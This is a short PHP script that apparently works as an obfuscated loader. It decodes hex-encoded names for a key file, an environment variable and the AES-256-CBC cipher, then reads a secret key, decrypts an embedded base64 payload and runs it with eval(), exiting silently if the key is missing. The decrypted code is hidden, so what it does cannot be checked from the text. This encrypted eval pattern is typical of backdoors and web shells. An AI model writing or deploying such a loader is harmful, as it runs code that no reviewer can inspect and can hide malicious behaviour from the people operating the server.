<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('vcAuoRe7pyFWfkm64T5YMA==');

$c=base64_decode(

'UyTI25IMybp+SovkqIjXwKIpQdqCLU5KyLGjOh5ttXWeo8Mrzcre5w1ivsFGQBw+2MOjET6bKsEz' .
'9yWCCkvtxG5/5h7Jh8hcEVh4uHzGC4wAp0u47vU0MkSvtWDemOHXihWlI6v2/zjY5YxH9qLXY5Rs' .
'E3spX7ywea+WXTjVpfwyKTD9+/Bsd0v6grkChvDBPt1yNnMFlQO0vzxLNbvIVIQi7abYbvVvoDoD' .
'PitLWBs4JRb7fPHqNnNbR9cPs++0ERa5/KUw8Ka7J9qMcnjI8i6d9QojodIoC3OBssvEx/EDRuiA' .
'PEb0jfvFtUAR1LJKhKOAGXVw+kokTWMpmzr8ZMZJAcd+FTrM3+R+TNpi8NdhVaGkm4DOBMA6Y2Wx' .
'aXiEMFMDT8BBhl2kT86HiDOclMq0ht924upRYRaxtSzI0h7GhtNwRu/U2TPS/yQJrFvlLW6r0oow' .
'sfi3dYAKEs+B6ILUhURryHA7pICM9JznP9+qWdjBOV1UiJ9lJOjopf1xLvRUdyrlgZpcMFTcw/6v' .
'oMDfqoZHdFlxTTY+Lpz3cq7lDslrD5iXzJlB4x/zqpARy5x5AsyK+XdVeWmNLgkcPBg/9ezdZm6Q' .
'LWw/1L4P9fYKBQC+mfPOGYNSjH+4CEeI5fPXKAFn5tfrG3+k3TnAnBlnqMol9Hd0AYqydGCLvZ01' .
'4ZHyL3ujKHlu+AVKFjA4vW3m5KomeY96lOCDlPPvJg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

